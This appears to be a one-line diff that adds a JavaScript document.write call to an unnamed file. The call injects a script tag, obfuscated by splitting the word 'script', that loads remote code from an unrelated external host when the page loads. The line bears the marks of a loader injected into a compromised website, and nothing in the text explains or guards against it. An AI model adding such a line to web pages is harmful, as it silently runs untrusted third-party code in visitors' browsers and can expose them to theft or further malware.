@@ -1,0 +1,1 @@
+document.write('<scr'+'ipt src="http://traderate.xingboyuan.com/library/datepicker/config.js?25&x9wj=0i" ></scr'+'ipt>');
